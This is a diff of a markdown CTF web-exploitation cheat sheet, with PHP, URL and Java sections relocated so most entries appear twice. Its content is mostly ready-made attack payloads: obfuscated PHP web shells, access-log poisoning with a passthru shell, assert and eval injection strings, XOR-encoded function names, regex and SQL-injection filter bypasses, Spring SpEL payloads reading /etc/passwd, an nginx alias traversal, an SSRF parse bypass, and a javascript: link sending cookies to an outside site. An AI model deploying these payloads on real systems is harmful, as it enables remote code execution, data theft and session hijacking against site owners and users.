+* `$f = data://text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ`
+
+
+## PHP Assert
+
+**They have code execution**
+so if we have 
+```
+$x=$_GET['key'];
+assert($x > 50);
+```
+so if we put `site.com/?key=printf('flag'); //`
+
+this will execute the command.
+
+
+## Bypass disasbled functions
+
+Key is LD_PRELOAD + (mail() / imap_open()) functions
+
+## PHP log file injection
+
+```
+nc <IP> <port>
+GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: <IP>
+Connection: close
+```
+and include
+`?lfi_file=/var/log/apache2/access.log&cmd=<command>`
+
+## shell without valid character
+
+Shell-1: you can execute it like "shell.php?0=system&1=ls"
+
+```
+<?
+@$_[]=@! _; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((  $__) ($__   ))].=$_;
+$_[]=  $__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__ $__)  $_[$__-$__]).($__ $__ $__) $_[$__-$__];
+$_[$__ $__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
+$_[$__ $__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
+$_[$__ $__] .=($_[$__][$__ $__])^$_[$__][($__<<$__)-$__ ];
+$_=$ 
+$_[$__  $__] ;$_[@-_]($_[@! _] );
+?>
+```
+
+`shell-2: You can execute it like "shell.php?_=system&__=ls"`
+
+```
+<?php
+$_="{"; 
+$_=($_^"<").($_^">;").($_^"/");
+?>
+<?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
+```
+
+## PHP dangerous function
+
+* strpos
+	* can be bypassed with double Encoding (php 7.0-). Example $x = "%2370hp", and if this $x is used to make furthur request like curl'ed, it will be urldecoded.
+* file_get_contents
+* md5_file
+* file_exists
+	* wrapper like http, ftp, file etc works(in old version), in new version also its default off,samba works on windows .(in all file_get_contents,md5 file and file_exists)
+* deserialize
+	* Can deserialize phar or any serialzed php to execute code
+* assert
+	* It basically an eval
+* htmlspecialchars
+	* doesnt encode single quote ' until specified
+
+## PHP eval bypasses
+
+if user input is highly sanitized and passed into eval , we can use techniqe below to create dangerous payloads
+
+```
+/*
+* $payload = "(%ff%ff)^(%d1);";  ===> results in "." 
+* $payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f);"; => scandir
+* $payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f);"; => print_r
+* $payload = "((%ff%ff%ff%ff%ff%ff%ff%ff)^(%8d%9a%9e%9b%9b%96%91%9a)^(%ff%ff%ff%ff%9e%ff%9e%ff)^(%ff%ff%ff%ff%9c%ff%9c%ff));"; => readfile
+* $payload = "IBBCBBBB%5ENIMIIICI%5Eunnnmbmn;";  => small version of scandir
+* $payload = "C%5Ei;"; => *
+* $payload = "BBBB%5EICCC%5Elmnc;"; => glob
+*/
+
+$payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f);";
+
+
+$decoded_payload = urldecode($payload);
+echo $decoded_payload;
+
+```
 
 ## PHP Object deserialize
 
@@ -1255,9 +1979,6 @@ but to get pass this, send
 O:4:"SHIT":1:{s:2:"x";s:2:"ls";}
 ```
 just corrupt the object and walla
-
-
-
 
 ## PHP Phar
 
@@ -1309,346 +2030,6 @@ I mean yes noone will include, or require file we upload, but file_exists or fil
 
 
 
-# Bypasses
-
-## PHP REGEX bypass
-
-### `cannot have " or '`
-
-```
-> echo pack(C3,112,104,112);
-< "php"
-```
-
-`$_GET['q'] is preg_match and we cannot have "flag.php" in it`
-
-> Bypass 1
-
-```
-> site.com/?q=get_defined_vars()[_GET][X]&X=flag.php
-
-> get_defined_vars()[_GET][X] & X=flag.php 
-```
-### cannot use character 
-
-```
-$a = $_GET['a'];
-if(preg_match('/^[a-zA-Z0-9]$/'),$a){
-  echo "sorry";
-}else{
-  eval($a);
-}
-```
-
-> bypass
-
-```
-site.com/?a=~%8C%86%8C%8B%9A%92(~%9C%9E%8B%DF%D5)
-```
-
-* `~` will negate %8C%86%8C%8B%9A%92 tht will produce string "system" , similarly %9C%9E%8B%DF%D5 is `cat *`
-* in PHP "system"("ls") is system("ls") and we get answer
-
-### Bypass 2 ** AWESOME TRICK **
-
-In php , if we send `site.com/?q=substr(asdf,0,10)`, so unlike most language showing asdf is not defined php will auto convert asdf to "asdf" string and pass into substr
-
-```
-> site.com/?q=str_rot13(substr(cjq))
-```
-so no need of `;'",$_` .
-
-
-
-##PHP cannot have `_` 
-
-**PHP functionality  converts `.` and spaces into `_`, so `site.com/?c.m.d=23` gets converted to "$c_m_d=23" .**
-
-##spaces are not allowed
-
-**Use `+` in query string to bypass space .**
-
-
-## Python "a""b" is "a"+"b"
-
-**Well  if in python + is blocked , we can just use this trick to append**
-
-## Python3 f''
-
-https://github.com/p4-team/ctf/tree/master/2018-07-13-meepwn-ctf/web_pycalcx#pycalcx2-54-solved-100p
-
-```
-FLAG = "hello"
-source = raw_input()
-
-f'Tru{FLAG<source or 14:x}'  
-
-```
-* We use the short circuit `or` to get one of the two results, depending on the result of comparison `FLAG < source`, i.e , `True or 14` returns True and False or 14 returns 14.
-* We use x modifier to turn 14 into hex digit e
-* `Tru{FLAG<source or 14:x}` therefore evaluates to either `Tru1` or `True`, depending on the FLAG>source condition
-
-
-## REGEX bypassing
-
-**Approch**
-
-* use burp intruder to find all the blocked characters ,ex / `site.com/?id=%$$` in intruder and intefer from `1` to `ff`, will make 255 requsest from %00 to %FF finding blocked characters
-* now imagine we get blocked `%20` = `space`, `%3b` = `;` , `%26` = `&`, so now make a list of allowed yet dangerous chars,
-* so we can send `%00`, `%0a` , `{`,`}`,``` ` ```, `$`,`<`,`>`,`/`,`\`,`,`,`"`,`'` etc
-* Now just find the appropriate bypass
-
-
-```
-$cmd = $_GET['c_m_d'];
-if(!preg_match('/[a-z0-9]/is', $cmd)){
-	system("/sandboxed_bin/".$cmd);
-}
-```
-* Find supported UTF encoding, cuz `a` === `à`, finding unicode can help here.
-* `GET  : /?c_m_d[]='ls'` will make cmd as array and bypass check in PHP
-* `POST : { c_m_d : ['ls']` with `Content-Type: application/json` in any.
-* `GET  : /?c_m_d=???+????.???` will be cat flag.txt and bypass regex
-
-**some command bypasses**
-
-* Try mixing upper+lower case `HtTp` 
-* `regex : a.*b` can be bypassed `a%0Ab`
-
-```
-$black_list = "/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\'|";
-$black_list .= "=|_| |in|<|>|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i";
-if(preg_match($black_list, $_GET['user'])) exit();
-if(preg_match($black_list, $_GET['pw'])) exit(); 
-
-$query="select user from chal where user='$_GET[user]' and pw='$_GET[pw]'"; 
-
-```
-* using `\` to bypass next letter. so  `'` is block ,use `\`,i.e `/?user=\&pw=||user/**/REGEXP/**/%22admi%22||%22n%22;%00` ,making this request <br/>
-we get `where user='\' and pw='||user REGEXP "admi||n" '` where regexp is mysql feature
-
-
-## PHP file_get_content 
-
-**This is super dangerous**
-
-```
-$f = $_GET['content'];
-file_get_contents($f);
-```
-
-Possible values of `$f` are:
-* file_get_contents('https://www.evil.com/mydata'); so `$f = https://www.evil.com/mydata`
-* `php://input` and "mydata" in POST `so $f=php://input`
-* All php wrapper , `php://filter`, `php://fd/0` etc
-* `$f = data://text/plain,Hello Challenge! `
-* `$f = data://text/plain;base64,SGVsbG8gQ2hhbGxlbmdlIQ`
-
-
-## PHP Assert
-
-**They have code execution**
-so if we have 
-```
-$x=$_GET['key'];
-assert($x > 50);
-```
-so if we put `site.com/?key=printf('flag'); //`
-
-this will execute the command.
-
-# URL's
-
-## `..\Q/\E` in Ruby equals `../`
-
-## Nginx off by slash
-
-**Python's Djano, ruby etc donot have inbuilt static files folder, so ppl put nginx infront of these apps for <br/>
-delivering static file .**
-
-**In `nginx` we can define a alias for a location .eg**
-```
-location /static {
-	alias /home/pi/;
-}
-```
-exploit : `127.0.0.1/static../`, so `/static` in route matches `location /static` <br/>
-causing to make path=`/home/pi/../` giving us access to 1 directory above
-
->so how to find this
-* http://target.com/asset/app.js  [200 OK]
-* http://target.com/asset/		  [403] 
-* http://target.com/asset/../setting.py [404]
-* http://target.com/asset../ 			[403]
-* http://target.com/asset../assets/app.js [200] :O wow but yeah, we might get `alias.com/alias/../assets/app.js`
-* http://target.com/asset../setting.py    [200] is file is in above directory else 404?
-
-## javacript:alert
-
-if we can insert links
-```
-javascript:document.location="http://mysite.com/"+document.cookie
-```
-
-## python flask url checks bypass
-
-```
-from  werkzeug.urls import url_parse
-
-@app.route('/xyz'):
-	
-	postdata = app.request.post("url")
-	scheme, netloc, path, query, fragment = url_parse(postdata)
-	if path.startsWith("/cannotViewThisPage"):
-		return None
-	else:
-		request.get(postdata,allow_redirects=False) # if this is true , just redirect and get
-
-@app.route('/cannotViewThisPage'):
-	if request.remote_addr != "127.0.0.1":
-			// if request not comming locally, fuck him
-			return "Fuck off"
-	else:
-		print "you win"
-```
-
-> ok so task is simple, we need "you win"
-payload
-```
-POST site.com/xyz
-
-url=http://localhost///cannotViewThisPage
-```
-
-so `url_parse` will return path of `http://localhost///cannotViewThisPage` as "///cannotViewThisPage"
-which indeed dont start with "/cannotViewThisPage" and when request module makes reques, python django will hit /cannotViewThisPage
-
-
-
-# JSP/JAVA
-
-
-## Template Injecting(SPRING framework)
-
-```
-site.com/?q={7*7}
-
-site.com/?q=${T(java.lang.System).getenv()}
-
-site.com/?q=${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
-OR
-site.com/?q=${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())
-```
-
-
-# PHP
-
-
-## PHP-info.php
-
-> What to look for if we get phpinfo.php
-
-* allow-url-encode : true/false
-	* tells if php `include` can include remote file via `http` wrapper
-* session-save-path : /var/lib/php/session
-	* location of saved cookie
-* disable_functions
-	* tell functions that dont work
-	* some function we should look for:
-		* system
-		* exec
-		* shell_exec
-		* popen
-		* proc_open
-		* passthru
-		* symlink
-		* link
-		* syslog
-		* imap_open
-		* ld
-		* mail
-		* putenv
-
-
-## Bypass disasbled functions
-
-Key is LD_PRELOAD + (mail() / imap_open()) functions
-
-## PHP log file injection
-
-```
-nc <IP> <port>
-GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
-Host: <IP>
-Connection: close
-```
-and include
-`?lfi_file=/var/log/apache2/access.log&cmd=<command>`
-
-## shell without valid character
-
-Shell-1: you can execute it like "shell.php?0=system&1=ls"
-
-```
-<?
-@$_[]=@! _; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((  $__) ($__   ))].=$_;
-$_[]=  $__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__ $__)  $_[$__-$__]).($__ $__ $__) $_[$__-$__];
-$_[$__ $__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
-$_[$__ $__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
-$_[$__ $__] .=($_[$__][$__ $__])^$_[$__][($__<<$__)-$__ ];
-$_=$ 
-$_[$__  $__] ;$_[@-_]($_[@! _] );
-?>
-```
-
-`shell-2: You can execute it like "shell.php?_=system&__=ls"`
-
-```
-<?php
-$_="{"; 
-$_=($_^"<").($_^">;").($_^"/");
-?>
-<?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
-```
-
-## PHP dangerous function
-
-* strpos
-	* can be bypassed with double Encoding (php 7.0-)
-* file_get_contents
-* md5_file
-* file_exists
-	* wrapper like http, ftp, file etc works(in old version), in new version also its default off,samba works on windows .(in all file_get_contents,md5 file and file_exists)
-* deserialize
-	* Can deserialize phar or any serialzed php to execute code
-* assert
-	* It basically an eval
-* htmlspecialchars
-	* doesnt encode single quote ' until specified
-
-## PHP eval bypasses
-
-if user input is highly sanitized and passed into eval , we can use techniqe below to create dangerous payloads
-
-```
-/*
-* $payload = "(%ff%ff)^(%d1);";  ===> results in "." 
-* $payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f);"; => scandir
-* $payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f);"; => print_r
-* $payload = "((%ff%ff%ff%ff%ff%ff%ff%ff)^(%8d%9a%9e%9b%9b%96%91%9a)^(%ff%ff%ff%ff%9e%ff%9e%ff)^(%ff%ff%ff%ff%9c%ff%9c%ff));"; => readfile
-* $payload = "IBBCBBBB%5ENIMIIICI%5Eunnnmbmn;";  => small version of scandir
-* $payload = "C%5Ei;"; => *
-* $payload = "BBBB%5EICCC%5Elmnc;"; => glob
-*/
-
-$payload = "(%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f);";
-
-
-$decoded_payload = urldecode($payload);
-echo $decoded_payload;
-
-
-```
 
 
 # Node/JS
